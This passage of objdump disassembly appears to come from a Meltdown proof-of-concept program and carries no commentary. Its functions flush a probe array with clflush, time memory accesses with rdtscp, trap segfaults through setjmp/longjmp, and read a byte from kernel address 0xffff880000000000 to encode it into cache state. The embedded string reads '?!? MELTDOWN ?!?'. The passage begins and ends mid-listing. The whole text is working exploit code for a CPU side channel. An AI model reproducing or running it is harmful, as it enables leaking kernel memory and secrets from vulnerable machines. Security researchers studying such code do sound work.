     9fe:	48 85 c0             	test   %rax,%rax
     a01:	74 0d                	je     a10 <deregister_tm_clones+0x30>
     a03:	5d                   	pop    %rbp
     a04:	ff e0                	jmpq   *%rax
     a06:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
     a0d:	00 00 00 
     a10:	5d                   	pop    %rbp
     a11:	c3                   	retq   
     a12:	0f 1f 40 00          	nopl   0x0(%rax)
     a16:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
     a1d:	00 00 00 

0000000000000a20 <register_tm_clones>:
     a20:	48 8d 3d e9 15 20 00 	lea    0x2015e9(%rip),%rdi        # 202010 <__TMC_END__>
     a27:	48 8d 35 e2 15 20 00 	lea    0x2015e2(%rip),%rsi        # 202010 <__TMC_END__>
     a2e:	55                   	push   %rbp
     a2f:	48 29 fe             	sub    %rdi,%rsi
     a32:	48 89 e5             	mov    %rsp,%rbp
     a35:	48 c1 fe 03          	sar    $0x3,%rsi
     a39:	48 89 f0             	mov    %rsi,%rax
     a3c:	48 c1 e8 3f          	shr    $0x3f,%rax
     a40:	48 01 c6             	add    %rax,%rsi
     a43:	48 d1 fe             	sar    %rsi
     a46:	74 18                	je     a60 <register_tm_clones+0x40>
     a48:	48 8b 05 a1 15 20 00 	mov    0x2015a1(%rip),%rax        # 201ff0 <_ITM_registerTMCloneTable>
     a4f:	48 85 c0             	test   %rax,%rax
     a52:	74 0c                	je     a60 <register_tm_clones+0x40>
     a54:	5d                   	pop    %rbp
     a55:	ff e0                	jmpq   *%rax
     a57:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
     a5e:	00 00 
     a60:	5d                   	pop    %rbp
     a61:	c3                   	retq   
     a62:	0f 1f 40 00          	nopl   0x0(%rax)
     a66:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
     a6d:	00 00 00 

0000000000000a70 <__do_global_dtors_aux>:
     a70:	80 3d a9 15 20 00 00 	cmpb   $0x0,0x2015a9(%rip)        # 202020 <completed.7697>
     a77:	75 2f                	jne    aa8 <__do_global_dtors_aux+0x38>
     a79:	48 83 3d 77 15 20 00 	cmpq   $0x0,0x201577(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
     a80:	00 
     a81:	55                   	push   %rbp
     a82:	48 89 e5             	mov    %rsp,%rbp
     a85:	74 0c                	je     a93 <__do_global_dtors_aux+0x23>
     a87:	48 8b 3d 7a 15 20 00 	mov    0x20157a(%rip),%rdi        # 202008 <__dso_handle>
     a8e:	e8 0d ff ff ff       	callq  9a0 <__cxa_finalize@plt>
     a93:	e8 48 ff ff ff       	callq  9e0 <deregister_tm_clones>
     a98:	c6 05 81 15 20 00 01 	movb   $0x1,0x201581(%rip)        # 202020 <completed.7697>
     a9f:	5d                   	pop    %rbp
     aa0:	c3                   	retq   
     aa1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
     aa8:	f3 c3                	repz retq 
     aaa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000000ab0 <frame_dummy>:
     ab0:	55                   	push   %rbp
     ab1:	48 89 e5             	mov    %rsp,%rbp
     ab4:	5d                   	pop    %rbp
     ab5:	e9 66 ff ff ff       	jmpq   a20 <register_tm_clones>

0000000000000aba <l1_init_LL>:
     aba:	55                   	push   %rbp
     abb:	48 89 e5             	mov    %rsp,%rbp
     abe:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
     ac2:	89 f0                	mov    %esi,%eax
     ac4:	88 45 e4             	mov    %al,-0x1c(%rbp)
     ac7:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
     ace:	eb 68                	jmp    b38 <l1_init_LL+0x7e>
     ad0:	8b 45 f8             	mov    -0x8(%rbp),%eax
     ad3:	83 c0 01             	add    $0x1,%eax
     ad6:	c1 e0 0c             	shl    $0xc,%eax
     ad9:	8d 50 07             	lea    0x7(%rax),%edx
     adc:	85 c0                	test   %eax,%eax
     ade:	0f 48 c2             	cmovs  %edx,%eax
     ae1:	c1 f8 03             	sar    $0x3,%eax
     ae4:	89 c2                	mov    %eax,%edx
     ae6:	0f b6 45 e4          	movzbl -0x1c(%rbp),%eax
     aea:	c1 e0 03             	shl    $0x3,%eax
     aed:	01 d0                	add    %edx,%eax
     aef:	48 98                	cltq   
     af1:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
     af8:	00 
     af9:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
     afd:	48 8d 0c 02          	lea    (%rdx,%rax,1),%rcx
     b01:	8b 45 f8             	mov    -0x8(%rbp),%eax
     b04:	c1 e0 0c             	shl    $0xc,%eax
     b07:	8d 50 07             	lea    0x7(%rax),%edx
     b0a:	85 c0                	test   %eax,%eax
     b0c:	0f 48 c2             	cmovs  %edx,%eax
     b0f:	c1 f8 03             	sar    $0x3,%eax
     b12:	89 c2                	mov    %eax,%edx
     b14:	0f b6 45 e4          	movzbl -0x1c(%rbp),%eax
     b18:	c1 e0 03             	shl    $0x3,%eax
     b1b:	01 d0                	add    %edx,%eax
     b1d:	48 98                	cltq   
     b1f:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
     b26:	00 
     b27:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
     b2b:	48 01 d0             	add    %rdx,%rax
     b2e:	48 89 ca             	mov    %rcx,%rdx
     b31:	48 89 10             	mov    %rdx,(%rax)
     b34:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
     b38:	83 7d f8 06          	cmpl   $0x6,-0x8(%rbp)
     b3c:	7e 92                	jle    ad0 <l1_init_LL+0x16>
     b3e:	c7 45 fc 09 00 00 00 	movl   $0x9,-0x4(%rbp)
     b45:	eb 70                	jmp    bb7 <l1_init_LL+0xfd>
     b47:	8b 45 fc             	mov    -0x4(%rbp),%eax
     b4a:	83 e8 01             	sub    $0x1,%eax
     b4d:	c1 e0 0c             	shl    $0xc,%eax
     b50:	8d 50 07             	lea    0x7(%rax),%edx
     b53:	85 c0                	test   %eax,%eax
     b55:	0f 48 c2             	cmovs  %edx,%eax
     b58:	c1 f8 03             	sar    $0x3,%eax
     b5b:	89 c2                	mov    %eax,%edx
     b5d:	0f b6 45 e4          	movzbl -0x1c(%rbp),%eax
     b61:	c1 e0 03             	shl    $0x3,%eax
     b64:	01 d0                	add    %edx,%eax
     b66:	48 98                	cltq   
     b68:	48 83 c0 01          	add    $0x1,%rax
     b6c:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
     b73:	00 
     b74:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
     b78:	48 8d 0c 02          	lea    (%rdx,%rax,1),%rcx
     b7c:	8b 45 fc             	mov    -0x4(%rbp),%eax
     b7f:	c1 e0 0c             	shl    $0xc,%eax
     b82:	8d 50 07             	lea    0x7(%rax),%edx
     b85:	85 c0                	test   %eax,%eax
     b87:	0f 48 c2             	cmovs  %edx,%eax
     b8a:	c1 f8 03             	sar    $0x3,%eax
     b8d:	89 c2                	mov    %eax,%edx
     b8f:	0f b6 45 e4          	movzbl -0x1c(%rbp),%eax
     b93:	c1 e0 03             	shl    $0x3,%eax
     b96:	01 d0                	add    %edx,%eax
     b98:	48 98                	cltq   
     b9a:	48 83 c0 01          	add    $0x1,%rax
     b9e:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
     ba5:	00 
     ba6:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
     baa:	48 01 d0             	add    %rdx,%rax
     bad:	48 89 ca             	mov    %rcx,%rdx
     bb0:	48 89 10             	mov    %rdx,(%rax)
     bb3:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
     bb7:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
     bbb:	7f 8a                	jg     b47 <l1_init_LL+0x8d>
     bbd:	90                   	nop
     bbe:	5d                   	pop    %rbp
     bbf:	c3                   	retq   

0000000000000bc0 <get_phys_addr>:
     bc0:	55                   	push   %rbp
     bc1:	48 89 e5             	mov    %rsp,%rbp
     bc4:	48 83 ec 40          	sub    $0x40,%rsp
     bc8:	48 89 7d c8          	mov    %rdi,-0x38(%rbp)
     bcc:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
     bd3:	00 00 
     bd5:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
     bd9:	31 c0                	xor    %eax,%eax
     bdb:	be 00 00 00 00       	mov    $0x0,%esi
     be0:	48 8d 3d a1 0c 00 00 	lea    0xca1(%rip),%rdi        # 1888 <_IO_stdin_used+0x8>
     be7:	b8 00 00 00 00       	mov    $0x0,%eax
     bec:	e8 6f fd ff ff       	callq  960 <open@plt>
     bf1:	89 45 d0             	mov    %eax,-0x30(%rbp)
     bf4:	83 7d d0 00          	cmpl   $0x0,-0x30(%rbp)
     bf8:	79 1f                	jns    c19 <get_phys_addr+0x59>
     bfa:	48 8d 0d 87 0e 00 00 	lea    0xe87(%rip),%rcx        # 1a88 <__PRETTY_FUNCTION__.4260>
     c01:	ba 14 00 00 00       	mov    $0x14,%edx
     c06:	48 8d 35 8e 0c 00 00 	lea    0xc8e(%rip),%rsi        # 189b <_IO_stdin_used+0x1b>
     c0d:	48 8d 3d 93 0c 00 00 	lea    0xc93(%rip),%rdi        # 18a7 <_IO_stdin_used+0x27>
     c14:	e8 d7 fc ff ff       	callq  8f0 <__assert_fail@plt>
     c19:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
     c1d:	48 8b 00             	mov    (%rax),%rax
     c20:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
     c24:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
     c28:	48 c7 45 d8 00 00 00 	movq   $0x0,-0x28(%rbp)
     c2f:	00 
     c30:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
     c34:	48 c1 e8 0c          	shr    $0xc,%rax
     c38:	48 c1 e0 03          	shl    $0x3,%rax
     c3c:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
     c40:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
     c44:	48 8d 75 d8          	lea    -0x28(%rbp),%rsi
     c48:	8b 45 d0             	mov    -0x30(%rbp),%eax
     c4b:	48 89 d1             	mov    %rdx,%rcx
     c4e:	ba 08 00 00 00       	mov    $0x8,%edx
     c53:	89 c7                	mov    %eax,%edi
     c55:	e8 26 fd ff ff       	callq  980 <pread@plt>
     c5a:	89 45 d4             	mov    %eax,-0x2c(%rbp)
     c5d:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
     c61:	48 c1 e0 0c          	shl    $0xc,%rax
     c65:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
     c69:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
     c6d:	48 c1 e0 0c          	shl    $0xc,%rax
     c71:	48 85 c0             	test   %rax,%rax
     c74:	75 1f                	jne    c95 <get_phys_addr+0xd5>
     c76:	48 8d 0d 0b 0e 00 00 	lea    0xe0b(%rip),%rcx        # 1a88 <__PRETTY_FUNCTION__.4260>
     c7d:	ba 1b 00 00 00       	mov    $0x1b,%edx
     c82:	48 8d 35 12 0c 00 00 	lea    0xc12(%rip),%rsi        # 189b <_IO_stdin_used+0x1b>
     c89:	48 8d 3d 1f 0c 00 00 	lea    0xc1f(%rip),%rdi        # 18af <_IO_stdin_used+0x2f>
     c90:	e8 5b fc ff ff       	callq  8f0 <__assert_fail@plt>
     c95:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
     c99:	48 c1 e0 0c          	shl    $0xc,%rax
     c9d:	48 89 c2             	mov    %rax,%rdx
     ca0:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
     ca4:	25 ff 0f 00 00       	and    $0xfff,%eax
     ca9:	48 09 d0             	or     %rdx,%rax
     cac:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
     cb0:	64 48 33 0c 25 28 00 	xor    %fs:0x28,%rcx
     cb7:	00 00 
     cb9:	74 05                	je     cc0 <get_phys_addr+0x100>
     cbb:	e8 10 fc ff ff       	callq  8d0 <__stack_chk_fail@plt>
     cc0:	c9                   	leaveq 
     cc1:	c3                   	retq   

0000000000000cc2 <unblock_signal>:
     cc2:	55                   	push   %rbp
     cc3:	48 89 e5             	mov    %rsp,%rbp
     cc6:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
     ccd:	89 bd 6c ff ff ff    	mov    %edi,-0x94(%rbp)
     cd3:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
     cda:	00 00 
     cdc:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
     ce0:	31 c0                	xor    %eax,%eax
     ce2:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
     ce9:	48 89 c7             	mov    %rax,%rdi
     cec:	e8 2f fc ff ff       	callq  920 <sigemptyset@plt>
     cf1:	8b 95 6c ff ff ff    	mov    -0x94(%rbp),%edx
     cf7:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
     cfe:	89 d6                	mov    %edx,%esi
     d00:	48 89 c7             	mov    %rax,%rdi
     d03:	e8 88 fc ff ff       	callq  990 <sigaddset@plt>
     d08:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
     d0f:	ba 00 00 00 00       	mov    $0x0,%edx
     d14:	48 89 c6             	mov    %rax,%rsi
     d17:	bf 01 00 00 00       	mov    $0x1,%edi
     d1c:	e8 7f fb ff ff       	callq  8a0 <sigprocmask@plt>
     d21:	90                   	nop
     d22:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
     d26:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
     d2d:	00 00 
     d2f:	74 05                	je     d36 <unblock_signal+0x74>
     d31:	e8 9a fb ff ff       	callq  8d0 <__stack_chk_fail@plt>
     d36:	c9                   	leaveq 
     d37:	c3                   	retq   

0000000000000d38 <trycatch_segfault_handler>:
     d38:	55                   	push   %rbp
     d39:	48 89 e5             	mov    %rsp,%rbp
     d3c:	48 83 ec 10          	sub    $0x10,%rsp
     d40:	89 7d fc             	mov    %edi,-0x4(%rbp)
     d43:	bf 0b 00 00 00       	mov    $0xb,%edi
     d48:	e8 75 ff ff ff       	callq  cc2 <unblock_signal>
     d4d:	bf 08 00 00 00       	mov    $0x8,%edi
     d52:	e8 6b ff ff ff       	callq  cc2 <unblock_signal>
     d57:	be 01 00 00 00       	mov    $0x1,%esi
     d5c:	48 8d 3d dd 12 20 00 	lea    0x2012dd(%rip),%rdi        # 202040 <trycatch_buf>
     d63:	e8 e8 fb ff ff       	callq  950 <longjmp@plt>

0000000000000d68 <flushprobe>:
     d68:	55                   	push   %rbp
     d69:	48 89 e5             	mov    %rsp,%rbp
     d6c:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
     d70:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
     d77:	eb 1b                	jmp    d94 <flushprobe+0x2c>
     d79:	8b 45 fc             	mov    -0x4(%rbp),%eax
     d7c:	48 98                	cltq   
     d7e:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
     d85:	00 
     d86:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
     d8a:	48 01 d0             	add    %rdx,%rax
     d8d:	0f ae 38             	clflush (%rax)
     d90:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
     d94:	81 7d fc ff ff 01 00 	cmpl   $0x1ffff,-0x4(%rbp)
     d9b:	7e dc                	jle    d79 <flushprobe+0x11>
     d9d:	90                   	nop
     d9e:	5d                   	pop    %rbp
     d9f:	c3                   	retq   

0000000000000da0 <test_flushprobe>:
     da0:	55                   	push   %rbp
     da1:	48 89 e5             	mov    %rsp,%rbp
     da4:	53                   	push   %rbx
     da5:	48 83 ec 28          	sub    $0x28,%rsp
     da9:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
     dad:	bf 00 08 00 00       	mov    $0x800,%edi
     db2:	e8 89 fb ff ff       	callq  940 <malloc@plt>
     db7:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
     dbb:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
     dc2:	eb 46                	jmp    e0a <test_flushprobe+0x6a>
     dc4:	8b 45 e0             	mov    -0x20(%rbp),%eax
     dc7:	48 98                	cltq   
     dc9:	48 c1 e0 0c          	shl    $0xc,%rax
     dcd:	48 89 c2             	mov    %rax,%rdx
     dd0:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
     dd4:	48 01 d0             	add    %rdx,%rax
     dd7:	48 89 c3             	mov    %rax,%rbx
     dda:	0f ae f0             	mfence 
     ddd:	0f 01 f9             	rdtscp 
     de0:	49 89 c2             	mov    %rax,%r10
     de3:	48 8b 0b             	mov    (%rbx),%rcx
     de6:	0f 01 f9             	rdtscp 
     de9:	4c 29 d0             	sub    %r10,%rax
     dec:	48 89 c3             	mov    %rax,%rbx
     def:	8b 45 e0             	mov    -0x20(%rbp),%eax
     df2:	48 98                	cltq   
     df4:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
     dfb:	00 
     dfc:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
     e00:	48 01 d0             	add    %rdx,%rax
     e03:	48 89 18             	mov    %rbx,(%rax)
     e06:	83 45 e0 01          	addl   $0x1,-0x20(%rbp)
     e0a:	81 7d e0 ff 00 00 00 	cmpl   $0xff,-0x20(%rbp)
     e11:	7e b1                	jle    dc4 <test_flushprobe+0x24>
     e13:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
     e1a:	eb 31                	jmp    e4d <test_flushprobe+0xad>
     e1c:	8b 45 e4             	mov    -0x1c(%rbp),%eax
     e1f:	48 98                	cltq   
     e21:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
     e28:	00 
     e29:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
     e2d:	48 01 d0             	add    %rdx,%rax
     e30:	48 8b 10             	mov    (%rax),%rdx
     e33:	8b 45 e4             	mov    -0x1c(%rbp),%eax
     e36:	89 c6                	mov    %eax,%esi
     e38:	48 8d 3d 82 0a 00 00 	lea    0xa82(%rip),%rdi        # 18c1 <_IO_stdin_used+0x41>
     e3f:	b8 00 00 00 00       	mov    $0x0,%eax
     e44:	e8 97 fa ff ff       	callq  8e0 <printf@plt>
     e49:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
     e4d:	81 7d e4 ff 00 00 00 	cmpl   $0xff,-0x1c(%rbp)
     e54:	7e c6                	jle    e1c <test_flushprobe+0x7c>
     e56:	90                   	nop
     e57:	48 83 c4 28          	add    $0x28,%rsp
     e5b:	5b                   	pop    %rbx
     e5c:	5d                   	pop    %rbp
     e5d:	c3                   	retq   

0000000000000e5e <prepare_probe>:
     e5e:	55                   	push   %rbp
     e5f:	48 89 e5             	mov    %rsp,%rbp
     e62:	48 83 ec 10          	sub    $0x10,%rsp
     e66:	be 00 00 10 00       	mov    $0x100000,%esi
     e6b:	bf 00 10 00 00       	mov    $0x1000,%edi
     e70:	e8 bb fa ff ff       	callq  930 <memalign@plt>
     e75:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
     e79:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
     e80:	eb 24                	jmp    ea6 <prepare_probe+0x48>
     e82:	8b 45 f4             	mov    -0xc(%rbp),%eax
     e85:	8d 0c 00             	lea    (%rax,%rax,1),%ecx
     e88:	8b 45 f4             	mov    -0xc(%rbp),%eax
     e8b:	48 98                	cltq   
     e8d:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
     e94:	00 
     e95:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
     e99:	48 01 c2             	add    %rax,%rdx
     e9c:	48 63 c1             	movslq %ecx,%rax
     e9f:	48 89 02             	mov    %rax,(%rdx)
     ea2:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
     ea6:	81 7d f4 ff ff 01 00 	cmpl   $0x1ffff,-0xc(%rbp)
     ead:	7e d3                	jle    e82 <prepare_probe+0x24>
     eaf:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
     eb3:	c9                   	leaveq 
     eb4:	c3                   	retq   

0000000000000eb5 <print_usage_message>:
     eb5:	55                   	push   %rbp
     eb6:	48 89 e5             	mov    %rsp,%rbp
     eb9:	48 8d 3d 12 0a 00 00 	lea    0xa12(%rip),%rdi        # 18d2 <_IO_stdin_used+0x52>
     ec0:	e8 fb f9 ff ff       	callq  8c0 <puts@plt>
     ec5:	48 8d 3d 24 0a 00 00 	lea    0xa24(%rip),%rdi        # 18f0 <_IO_stdin_used+0x70>
     ecc:	e8 ef f9 ff ff       	callq  8c0 <puts@plt>
     ed1:	48 8d 3d 50 0a 00 00 	lea    0xa50(%rip),%rdi        # 1928 <_IO_stdin_used+0xa8>
     ed8:	e8 e3 f9 ff ff       	callq  8c0 <puts@plt>
     edd:	48 8d 3d 64 0a 00 00 	lea    0xa64(%rip),%rdi        # 1948 <_IO_stdin_used+0xc8>
     ee4:	e8 d7 f9 ff ff       	callq  8c0 <puts@plt>
     ee9:	48 8d 3d a0 0a 00 00 	lea    0xaa0(%rip),%rdi        # 1990 <_IO_stdin_used+0x110>
     ef0:	e8 cb f9 ff ff       	callq  8c0 <puts@plt>
     ef5:	48 8d 3d da 0a 00 00 	lea    0xada(%rip),%rdi        # 19d6 <_IO_stdin_used+0x156>
     efc:	e8 bf f9 ff ff       	callq  8c0 <puts@plt>
     f01:	90                   	nop
     f02:	5d                   	pop    %rbp
     f03:	c3                   	retq   

0000000000000f04 <main>:
     f04:	55                   	push   %rbp
     f05:	48 89 e5             	mov    %rsp,%rbp
     f08:	53                   	push   %rbx
     f09:	48 81 ec d8 00 00 00 	sub    $0xd8,%rsp
     f10:	89 bd 2c ff ff ff    	mov    %edi,-0xd4(%rbp)
     f16:	48 89 b5 20 ff ff ff 	mov    %rsi,-0xe0(%rbp)
     f1d:	b8 00 00 00 00       	mov    $0x0,%eax
     f22:	e8 37 ff ff ff       	callq  e5e <prepare_probe>
     f27:	48 89 45 80          	mov    %rax,-0x80(%rbp)
     f2b:	48 8b 45 80          	mov    -0x80(%rbp),%rax
     f2f:	48 89 45 88          	mov    %rax,-0x78(%rbp)
     f33:	48 8b 45 88          	mov    -0x78(%rbp),%rax
     f37:	48 89 c7             	mov    %rax,%rdi
     f3a:	e8 29 fe ff ff       	callq  d68 <flushprobe>
     f3f:	48 8b 85 20 ff ff ff 	mov    -0xe0(%rbp),%rax
     f46:	48 83 c0 08          	add    $0x8,%rax
     f4a:	48 8b 00             	mov    (%rax),%rax
     f4d:	48 89 c7             	mov    %rax,%rdi
     f50:	e8 1b fa ff ff       	callq  970 <atoi@plt>
     f55:	89 85 7c ff ff ff    	mov    %eax,-0x84(%rbp)
     f5b:	83 bd 2c ff ff ff 02 	cmpl   $0x2,-0xd4(%rbp)
     f62:	74 14                	je     f78 <main+0x74>
     f64:	b8 00 00 00 00       	mov    $0x0,%eax
     f69:	e8 47 ff ff ff       	callq  eb5 <print_usage_message>
     f6e:	b8 01 00 00 00       	mov    $0x1,%eax
     f73:	e9 6f 08 00 00       	jmpq   17e7 <main+0x8e3>
     f78:	83 bd 7c ff ff ff 00 	cmpl   $0x0,-0x84(%rbp)
     f7f:	75 30                	jne    fb1 <main+0xad>
     f81:	48 8d 3d 70 0a 00 00 	lea    0xa70(%rip),%rdi        # 19f8 <_IO_stdin_used+0x178>
     f88:	e8 33 f9 ff ff       	callq  8c0 <puts@plt>
     f8d:	48 8b 45 88          	mov    -0x78(%rbp),%rax
     f91:	48 89 c7             	mov    %rax,%rdi
     f94:	e8 07 fe ff ff       	callq  da0 <test_flushprobe>
     f99:	48 8d 3d 80 0a 00 00 	lea    0xa80(%rip),%rdi        # 1a20 <_IO_stdin_used+0x1a0>
     fa0:	e8 1b f9 ff ff       	callq  8c0 <puts@plt>
     fa5:	48 8b 45 88          	mov    -0x78(%rbp),%rax
     fa9:	48 89 c7             	mov    %rax,%rdi
     fac:	e8 ef fd ff ff       	callq  da0 <test_flushprobe>
     fb1:	83 bd 7c ff ff ff 01 	cmpl   $0x1,-0x84(%rbp)
     fb8:	0f 85 2a 01 00 00    	jne    10e8 <main+0x1e4>
     fbe:	48 8d 35 73 fd ff ff 	lea    -0x28d(%rip),%rsi        # d38 <trycatch_segfault_handler>
     fc5:	bf 0b 00 00 00       	mov    $0xb,%edi
     fca:	e8 41 f9 ff ff       	callq  910 <signal@plt>
     fcf:	48 b8 00 00 00 00 00 	movabs $0xffff880000000000,%rax
     fd6:	88 ff ff 
     fd9:	48 89 45 90          	mov    %rax,-0x70(%rbp)
     fdd:	48 8d 3d 5c 10 20 00 	lea    0x20105c(%rip),%rdi        # 202040 <trycatch_buf>
     fe4:	e8 17 f9 ff ff       	callq  900 <_setjmp@plt>
     fe9:	85 c0                	test   %eax,%eax
     feb:	75 2a                	jne    1017 <main+0x113>
     fed:	48 8b 75 90          	mov    -0x70(%rbp),%rsi
     ff1:	48 8b 45 88          	mov    -0x78(%rbp),%rax
     ff5:	48 89 c1             	mov    %rax,%rcx
     ff8:	48 89 f3             	mov    %rsi,%rbx
     ffb:	48 c7 c0 00 00 00 00 	mov    $0x0,%rax
    1002:	0f ae f0             	mfence 
    1005:	48 0f b6 03          	movzbq (%rbx),%rax
    1009:	48 c1 e0 0c          	shl    $0xc,%rax
    100d:	48 01 c1             	add    %rax,%rcx
    1010:	48 8b 11             	mov    (%rcx),%rdx
    1013:	48 89 4d 88          	mov    %rcx,-0x78(%rbp)
    1017:	bf 00 08 00 00       	mov    $0x800,%edi
    101c:	e8 1f f9 ff ff       	callq  940 <malloc@plt>
    1021:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    1025:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    1029:	48 89 45 88          	mov    %rax,-0x78(%rbp)
    102d:	c7 85 3c ff ff ff 00 	movl   $0x0,-0xc4(%rbp)
    1034:	00 00 00 
    1037:	eb 4c                	jmp    1085 <main+0x181>
    1039:	8b 85 3c ff ff ff    	mov    -0xc4(%rbp),%eax
    103f:	48 98                	cltq   
    1041:	48 c1 e0 0c          	shl    $0xc,%rax
    1045:	48 89 c2             	mov    %rax,%rdx
    1048:	48 8b 45 88          	mov    -0x78(%rbp),%rax
    104c:	48 01 d0             	add    %rdx,%rax
    104f:	48 89 c3             	mov    %rax,%rbx
    1052:	0f 01 f9             	rdtscp 
    1055:	49 89 c2             	mov    %rax,%r10
    1058:	48 8b 0b             	mov    (%rbx),%rcx
    105b:	0f 01 f9             	rdtscp 
    105e:	4c 29 d0             	sub    %r10,%rax
    1061:	48 89 c3             	mov    %rax,%rbx
    1064:	8b 85 3c ff ff ff    	mov    -0xc4(%rbp),%eax
    106a:	48 98                	cltq   
    106c:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1073:	00 
    1074:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1078:	48 01 d0             	add    %rdx,%rax
    107b:	48 89 18             	mov    %rbx,(%rax)
    107e:	83 85 3c ff ff ff 01 	addl   $0x1,-0xc4(%rbp)
    1085:	81 bd 3c ff ff ff ff 	cmpl   $0xff,-0xc4(%rbp)
    108c:	00 00 00 
    108f:	7e a8                	jle    1039 <main+0x135>
    1091:	c7 85 40 ff ff ff 00 	movl   $0x0,-0xc0(%rbp)
    1098:	00 00 00 
    109b:	eb 3a                	jmp    10d7 <main+0x1d3>
    109d:	8b 85 40 ff ff ff    	mov    -0xc0(%rbp),%eax
    10a3:	48 98                	cltq   
    10a5:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    10ac:	00 
    10ad:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    10b1:	48 01 d0             	add    %rdx,%rax
    10b4:	48 8b 10             	mov    (%rax),%rdx
    10b7:	8b 85 40 ff ff ff    	mov    -0xc0(%rbp),%eax
    10bd:	89 c6                	mov    %eax,%esi
    10bf:	48 8d 3d 81 09 00 00 	lea    0x981(%rip),%rdi        # 1a47 <_IO_stdin_used+0x1c7>
    10c6:	b8 00 00 00 00       	mov    $0x0,%eax
    10cb:	e8 10 f8 ff ff       	callq  8e0 <printf@plt>
    10d0:	83 85 40 ff ff ff 01 	addl   $0x1,-0xc0(%rbp)
    10d7:	81 bd 40 ff ff ff ff 	cmpl   $0xff,-0xc0(%rbp)
    10de:	00 00 00 
    10e1:	7e ba                	jle    109d <main+0x199>
    10e3:	e9 e2 06 00 00       	jmpq   17ca <main+0x8c6>
    10e8:	83 bd 7c ff ff ff 02 	cmpl   $0x2,-0x84(%rbp)
    10ef:	0f 85 50 03 00 00    	jne    1445 <main+0x541>
    10f5:	bf 12 00 00 00       	mov    $0x12,%edi
    10fa:	e8 41 f8 ff ff       	callq  940 <malloc@plt>
    10ff:	48 89 45 98          	mov    %rax,-0x68(%rbp)
    1103:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    1107:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    110b:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    110f:	48 bb 3f 21 3f 20 4d 	movabs $0x544c454d203f213f,%rbx
    1116:	45 4c 54 
    1119:	48 be 44 4f 57 4e 20 	movabs $0x3f213f204e574f44,%rsi
    1120:	3f 21 3f 
    1123:	48 89 18             	mov    %rbx,(%rax)
    1126:	48 89 70 08          	mov    %rsi,0x8(%rax)
    112a:	c6 40 10 00          	movb   $0x0,0x10(%rax)
    112e:	c7 85 44 ff ff ff 00 	movl   $0x0,-0xbc(%rbp)
    1135:	00 00 00 
    1138:	e9 ea 02 00 00       	jmpq   1427 <main+0x523>
